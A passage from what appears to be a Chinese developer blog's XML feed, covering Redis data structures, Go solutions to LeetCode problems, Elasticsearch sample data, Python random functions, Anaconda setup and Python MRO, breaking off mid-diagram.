        <content type="html"><![CDATA[<h4 id="为什么有可比性"><a href="#为什么有可比性" class="headerlink" title="为什么有可比性"></a>为什么有可比性</h4><p>它们都是用于解决数据集合的查找问题，即根据指定的key，快速查到它所在的位置或者对应的value。</p><h4 id="Redis用跳表不用B-树的原因"><a href="#Redis用跳表不用B-树的原因" class="headerlink" title="Redis用跳表不用B+树的原因"></a>Redis用跳表不用B+树的原因</h4><p>redis是内存数据库，儿B+树是为了mysql这种io数据库准备的。B+树每个节点的数量都是一个mysql分区页的大小。</p><h4 id="数据结构对比"><a href="#数据结构对比" class="headerlink" title="数据结构对比"></a>数据结构对比</h4><table><thead><tr><th>数据结构</th><th>实现原理</th><th>查询方式</th><th>查找</th><th>存储</th><th>插入删除</th></tr></thead><tbody><tr><td>Hash</td><td>哈希表</td><td>单key</td><td>O(1)</td><td>除数据外没有额外存储</td><td>O(1)</td></tr><tr><td>B+树</td><td>平衡二叉树扩展而来</td><td>单key，范围，分页</td><td>O(logn)</td><td>数据，左右指针，页节点指针</td><td>O(logn)</td></tr><tr><td>跳表</td><td>有序链表扩展而来</td><td>单key，分页</td><td>O(logn)</td><td>数据，指针，每个节点指针&lt;2，所以占用空间比B+树小</td><td>O(logn)</td></tr></tbody></table><h4 id="redis-SortedSet底层数据结构"><a href="#redis-SortedSet底层数据结构" class="headerlink" title="redis SortedSet底层数据结构"></a>redis SortedSet底层数据结构</h4><p> zset底层的存储结构包括ziplist或skiplist，在同时满足以下两个条件的时候使用ziplist，其他时候使用skiplist，两个条件如下：</p><ul><li>有序集合保存的元素数量小于128个</li><li>有序集合保存的所有元素的长度小于64字节</li></ul><p> 当ziplist作为zset的底层存储结构时候，每个集合元素使用两个紧挨在一起的压缩列表节点来保存，第一个节点保存元素的成员，第二个元素保存元素的分值。</p><p> 当skiplist作为zset的底层存储结构的时候，使用skiplist按序保存元素及分值，使用dict来保存元素和分值的映射关系。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-pprof</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-05-06-Golang-pprof/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-05-06-Golang-pprof/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-GMP原理与调度分析</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-05-06-Golang-GMP%E5%8E%9F%E7%90%86%E4%B8%8E%E8%B0%83%E5%BA%A6%E5%88%86%E6%9E%90/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-05-06-Golang-GMP%E5%8E%9F%E7%90%86%E4%B8%8E%E8%B0%83%E5%BA%A6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十万个为什么</title>
      <link href="/uncatesgorized/2021-04-15-%E5%8D%81%E4%B8%87%E4%B8%AA%E4%B8%BA%E4%BB%80%E4%B9%88/"/>
      <url>/uncatesgorized/2021-04-15-%E5%8D%81%E4%B8%87%E4%B8%AA%E4%B8%BA%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<h3 id="不懂就问"><a href="#不懂就问" class="headerlink" title="不懂就问"></a>不懂就问</h3><p>记录遇到了但是并不能立马找到答案的问题，大佬们既然这样做了，一定有它的道理。</p><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h4><ul><li>redis pipeline底层实现是队列，队列先进先出的特性，保证了数据的顺序性。pipeline默认同步个数为53个，也就是说args累加到53条数据时会把数据提交。为什么是53？</li></ul><h4 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h4><ul><li>Mysql  默认最大连接数上限为151，如果超过会报错：==MySQL: ERROR 1040: Too many connections==，5.5+默认最大连接数都是151，上限为100000。为什么是151？</li></ul><h4 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h4><ul><li>sort在排序时会根据数据量不同选择不同的方法，元素个数小于等于12时，会选择希尔排序。为什么是12？</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-206-反转链表</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-14-LeetCode-206-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-14-LeetCode-206-%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>反转一个单链表。 </p><p>示例: </p><p>输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL<br>输出: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL </p><p>进阶:<br>你可以迭代或递归地反转链表。你能否用两种方法解决这道题？ </p><p><a href="https://leetcode-cn.com/problems/reverse-linked-list/">https://leetcode-cn.com/problems/reverse-linked-list/</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>每个节点都只关心自己和下一个节点的指向关系</li><li>node.Next.Next = node</li><li>node.Next = nil</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">func reverseList(head *ListNode) *ListNode {</span><br><span class="line">if head==nil{</span><br><span class="line">return nil</span><br><span class="line">}</span><br><span class="line">return revert(head)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func revert(head *ListNode) *ListNode {</span><br><span class="line">if head.Next==nil{</span><br><span class="line">return head</span><br><span class="line">}</span><br><span class="line">h := revert(head.Next)</span><br><span class="line">head.Next.Next = head</span><br><span class="line">head.Next=nil</span><br><span class="line">return h</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-160-相交链表</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-14-LeetCode-160-%E7%9B%B8%E4%BA%A4%E9%93%BE%E8%A1%A8/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-14-LeetCode-160-%E7%9B%B8%E4%BA%A4%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>编写一个程序，找到两个单链表相交的起始节点。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-236-二叉树的最近公共祖先</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-13-LeetCode-236-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-13-LeetCode-236-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E8%BF%91%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/</url>
      
        <content type="html"><![CDATA[<p>给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。</p><p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个节点 p、q，最近公共祖先表示为一个节点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p><p><a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree">https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-tree</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>情况1：p,q 在 root 两侧</li><li>情况2：p或q 等于 root, 且另一个节点在root的子树中</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">func lowestCommonAncestor(root, p, q *TreeNode) *TreeNode {</span><br><span class="line">if root == nil || root == q || root == p {</span><br><span class="line">return root</span><br><span class="line">}</span><br><span class="line">left := lowestCommonAncestor(root.Left, p, q)</span><br><span class="line">right := lowestCommonAncestor(root.Right, p, q)</span><br><span class="line">if left == nil {</span><br><span class="line">return right</span><br><span class="line">}</span><br><span class="line">if right == nil {</span><br><span class="line">return left</span><br><span class="line">}</span><br><span class="line">return root</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-215-数组中的第K个最大元素</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-12-LeetCode-215-%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-12-LeetCode-215-%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E7%AC%ACK%E4%B8%AA%E6%9C%80%E5%A4%A7%E5%85%83%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<p>在未排序的数组中找到第 k 个最大的元素。请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。</p><p>示例 1:</p><p>输入: [3,2,1,5,6,4] 和 k = 2<br>输出: 5<br>示例&nbsp;2:</p><p>输入: [3,2,3,1,2,4,5,5,6] 和 k = 4<br>输出: 4<br>说明:</p><p>你可以假设 k 总是有效的，且 1 ≤ k ≤ 数组的长度。</p><p><a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array">https://leetcode-cn.com/problems/kth-largest-element-in-an-array</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>最小堆</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">type MinHeap struct {</span><br><span class="line">arr  []int</span><br><span class="line">size int</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (m *MinHeap) Len() int {</span><br><span class="line">return len(m.arr)</span><br><span class="line">}</span><br><span class="line">func (m *MinHeap) Less(i, j int) bool {</span><br><span class="line">return m.arr[i] &lt; m.arr[j]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (m *MinHeap) Swap(i, j int) {</span><br><span class="line">m.arr[i], m.arr[j] = m.arr[j], m.arr[i]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (m *MinHeap) Push(v interface{}) {</span><br><span class="line">m.arr = append(m.arr, v.(int))</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (m *MinHeap) Pop() interface{} {</span><br><span class="line">t := m.arr[m.Len()-1] // 最后一个</span><br><span class="line">m.arr = m.arr[0 : m.Len()-1]</span><br><span class="line">return t</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (m *MinHeap) Top() int {</span><br><span class="line">return m.arr[0] // 第一个</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (m *MinHeap) RealPush(v int) {</span><br><span class="line">if m.size == m.Len() {</span><br><span class="line">if m.Top() &lt; v {</span><br><span class="line">heap.Pop(m)</span><br><span class="line">heap.Push(m, v)</span><br><span class="line">}</span><br><span class="line">} else {</span><br><span class="line">heap.Push(m, v)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func InitHeap(size int) MinHeap {</span><br><span class="line">m := MinHeap{</span><br><span class="line">arr:  make([]int, 0),</span><br><span class="line">size: size,</span><br><span class="line">}</span><br><span class="line">heap.Init(&amp;m)</span><br><span class="line">return m</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode-20-有效括号</title>
      <link href="/%E7%AE%97%E6%B3%95/2021-04-11-LeetCode-20-%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7/"/>
      <url>/%E7%AE%97%E6%B3%95/2021-04-11-LeetCode-20-%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’&nbsp;的字符串 s ，判断字符串是否有效。</p><p>有效字符串需满足：</p><p>左括号必须用相同类型的右括号闭合。<br>左括号必须以正确的顺序闭合。</p><p><a href="https://leetcode-cn.com/problems/valid-parentheses/">https://leetcode-cn.com/problems/valid-parentheses/</a></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>滑动窗口</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">type stack struct {</span><br><span class="line">arr []int32</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func (s *stack) push(c int32) {</span><br><span class="line">s.arr = append(s.arr, c)</span><br><span class="line">}</span><br><span class="line">func (s *stack) pop() int32 {</span><br><span class="line">var t int32</span><br><span class="line">if !s.isEmpty() {</span><br><span class="line">t = s.arr[len(s.arr)-1]</span><br><span class="line">s.arr = s.arr[:len(s.arr)-1]</span><br><span class="line">}</span><br><span class="line">return t</span><br><span class="line">}</span><br><span class="line">func (s *stack) isEmpty() bool {</span><br><span class="line">if len(s.arr) == 0 {</span><br><span class="line">return true</span><br><span class="line">}</span><br><span class="line">return false</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func isValid(s string) bool {</span><br><span class="line">m := map[int32]int32{</span><br><span class="line">')': '(',</span><br><span class="line">']': '[',</span><br><span class="line">'}': '{',</span><br><span class="line">}</span><br><span class="line">sta := stack{arr: make([]int32, 0, 0)}</span><br><span class="line">for _, v := range s {</span><br><span class="line">if mv, ok := m[v]; ok {</span><br><span class="line">if sta.pop() != mv {</span><br><span class="line">return false</span><br><span class="line">}</span><br><span class="line">} else {</span><br><span class="line">sta.push(v)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">if sta.isEmpty() {</span><br><span class="line">return true</span><br><span class="line">}</span><br><span class="line">return false</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch data</title>
      <link href="/uncatesgorized/2021-04-09-Elasticsearch-data/"/>
      <url>/uncatesgorized/2021-04-09-Elasticsearch-data/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">{Id:443,Name:"林黛玉",Description:"可叹停机德，堪怜咏絮才。玉带林中挂，金簪雪里埋。",Age:15}</span><br><span class="line">,{Id:444,Name:"薛宝钗",Description:"可叹停机德，堪怜咏絮才。玉带林中挂，金簪雪里埋。",Age:17}</span><br><span class="line">,{Id:445,Name:"贾元春",Description:"二十年来辨是非，榴花开处照宫闱。三春争及初春景，虎兔相逢大梦归。",Age:45}</span><br><span class="line">,{Id:446,Name:"贾探春",Description:"才自精明志自高，生于末世运偏消。清明涕送江边望，千里东风一梦遥。",Age:19}</span><br><span class="line">,{Id:447,Name:"贾迎春",Description:"子系中山狼，得志便猖狂。金闺花柳质，一载赴黄粱。",Age:22}</span><br><span class="line">,{Id:448,Name:"贾惜春",Description:"勘破三春景不长，缁衣顿改昔年装。可怜绣户侯门女，独卧青灯古佛旁。",Age:13}</span><br><span class="line">,{Id:449,Name:"史湘云",Description:"富贵又何为，襁褓之间父母违。展眼吊斜晖，湘江水逝楚云飞。",Age:15}</span><br><span class="line">,{Id:450,Name:"妙玉",Description:"欲洁何曾洁，云空未必空。可怜金玉质，终陷淖泥中！",Age:18}</span><br><span class="line">,{Id:451,Name:"王熙凤",Description:"凡鸟偏从末世来，都知爱慕此生才。一从二令三人木，哭向金陵事更哀。",Age:35}</span><br><span class="line">,{Id:452,Name:"巧姐",Description:"势败休云贵，家亡莫论亲。偶因济刘氏，巧得遇恩人。",Age:9}</span><br><span class="line">,{Id:453,Name:"李纨",Description:"桃李春风结子完，到头谁似一盆兰。如冰水好空相妒，枉与他人作笑谈！",Age:36}</span><br><span class="line">,{Id:454,Name:"秦可卿",Description:"情天情海幻情身，情既相逢必主淫。漫言不肖皆荣出，造衅开端实在宁。",Age:35}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-随机函数</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-%E9%9A%8F%E6%9C%BA%E5%87%BD%E6%95%B0/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-%E9%9A%8F%E6%9C%BA%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.runoob.com/python/python-numbers.html">菜鸟教程</a></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">print random.randint(1,10)         # 产生 1 到 10 的一个整数型随机数  </span><br><span class="line">print random.choice(rande(10))   # 产生 0 到 9 的一个整数型随机数  </span><br><span class="line">print random.random()              # 产生 [0,1) 之间的随机浮点数</span><br><span class="line">print random.uniform(0,100)        # 产生  [0,100] 之间的随机浮点数，不是整数</span><br><span class="line">print random.choice('tomorrow')    # 从序列中随机选取一个元素</span><br><span class="line">print random.randrange(1,100,2)    # 生成从1到100的间隔为2的随机整数</span><br><span class="line"></span><br><span class="line">mylist = list("hello,world!")      # 将序列a中的元素顺序打乱</span><br><span class="line">random.shuffle(mylist)</span><br><span class="line">print mylist</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-Windows多版本安装</title>
      <link href="/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-Python-Windows%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85/"/>
      <url>/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-Python-Windows%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h4 id="可能的解决方案"><a href="#可能的解决方案" class="headerlink" title="可能的解决方案"></a>可能的解决方案</h4><ul><li>安装多个python版本，使用不同的命令进s行版本的区分<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\hero\python2</span><br><span class="line">Python 2.7.X</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">C:\Users\hero\python3</span><br><span class="line">Python 3.X.X</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">两个python版本都装了pip以后怎么办?</span><br><span class="line">python安装路径找到Scripts文件夹，进入里面找到pip*-script.py，打开修改第一句为要指定的python解释器。</span><br></pre></td></tr></tbody></table></figure></li><li>virtualenv</li><li>anaconda(推荐)</li><li>…(如果有更好的方案再补充)</li></ul><h4 id="anaconda是什么？"><a href="#anaconda是什么？" class="headerlink" title="anaconda是什么？"></a>anaconda是什么？</h4><ul><li>Anaconda是开源的python发行版本，包含了大量科学包。主要是可以用来进行python的环境管理，也就是说利用Conda可以在同一台机器上进行不同版本python的切换</li></ul><h4 id="为什么用anaconda？"><a href="#为什么用anaconda？" class="headerlink" title="为什么用anaconda？"></a>为什么用anaconda？</h4><ul><li>希望自己的机器上同时拥有不同版本的python，以满足不同代码的需求。</li><li>Windows环境下使用virtualenv对Python进行多版本隔离，但是前提是能安装上多个版本。[笑哭.jpg]</li><li>Win8.1安装Python==3.5==以上提示缺失==api-ms-win-crt-runtime-l1-1-0.dll==问题</li></ul><h4 id="怎么安装anaconda？"><a href="#怎么安装anaconda？" class="headerlink" title="怎么安装anaconda？"></a>怎么安装anaconda？</h4><ul><li>国内镜像地址 : <blockquote><p><a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">清华大学开源软件镜像站</a><br><a href="https://jingyan.baidu.com/article/3f16e0031e87522591c10320.html">如何安装Anaconda和Python</a></p></blockquote></li></ul><h4 id="安装anaconda过程"><a href="#安装anaconda过程" class="headerlink" title="安装anaconda过程"></a>安装anaconda过程</h4><ul><li>安装好anaconda之后会自带：base(root)<br>的python</li><li>安装其他版本的python<blockquote><ul><li>添加清华镜像(不然安装会超时)</li></ul></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/</span><br><span class="line">conda config --set show_channel_urls yes</span><br></pre></td></tr></tbody></table></figure></li></ul><h4 id="Conda命令"><a href="#Conda命令" class="headerlink" title="Conda命令"></a>Conda命令</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">conda create --name python27 python=2.7 环境2.7名称python27</span><br><span class="line">conda create –name cpu 创建一个名为cpu的环境 </span><br><span class="line">source activate cpu 激活cpu环境 </span><br><span class="line">source deactivate 禁用当前环境 </span><br><span class="line">conda remove –name 环境名 –all </span><br><span class="line">conda search 软件名 //可以查看到对应的不同版本 </span><br><span class="line">conda install 软件名 安装软件 </span><br><span class="line">conda list 查看已安装的package </span><br><span class="line">conda list -n 环境名 查看指定环境已安装的package </span><br><span class="line">conda install -n 环境名 软件名 指定环境名 安装软件 </span><br><span class="line">如果不用-n指定环境名称，则被安装在当前活跃环境 </span><br><span class="line">conda update -n 环境名 软件名 指定环境名更新软件 </span><br><span class="line">conda remove -n 环境名 软件名 删除指定环境的指定软件包 </span><br><span class="line">conda env list //查看现有的环境</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-官网例子读懂MRO继承</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-%E5%AE%98%E7%BD%91%E4%BE%8B%E5%AD%90%E8%AF%BB%E6%87%82MRO%E7%BB%A7%E6%89%BF/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-%E5%AE%98%E7%BD%91%E4%BE%8B%E5%AD%90%E8%AF%BB%E6%87%82MRO%E7%BB%A7%E6%89%BF/</url>
      
        <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/25321349">知乎详解（官网翻译）</a></p><p><a href="http://python.jobbole.com/85685/">MRO历史</a></p><h4 id="C3方法解析顺序-The-C3-Method-Resolution-Order"><a href="#C3方法解析顺序-The-C3-Method-Resolution-Order" class="headerlink" title="C3方法解析顺序(The C3 Method Resolution Order)"></a>C3方法解析顺序(The C3 Method Resolution Order)</h4><ul><li><p>像深度又像广度排序</p><h5 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; O = object</span><br><span class="line">&gt;&gt;&gt; class F(O): pass</span><br><span class="line">&gt;&gt;&gt; class E(O): pass</span><br><span class="line">&gt;&gt;&gt; class D(O): pass</span><br><span class="line">&gt;&gt;&gt; class C(D,F): pass</span><br><span class="line">&gt;&gt;&gt; class B(D,E): pass</span><br><span class="line">&gt;&gt;&gt; class A(B,C): pass</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">                          6</span><br><span class="line">                         ---</span><br><span class="line">Level 3                 | O |                  (more general)</span><br><span class="line">                      /  ---  \</span><br><span class="line">                     /    |    \                      |</span><br><span class="line">                    /     |     \                     |</span><br><span class="line">                   /      |      \                    |</span><br><span class="line">                  ---    ---    ---                   |</span><br><span class="line">Level 2        3 | D | 4| E |  | F | 5                |</span><br><span class="line">                  ---    ---    ---                   |</span><br><span class="line">                   \  \ _ /       |                   |</span><br><span class="line">                 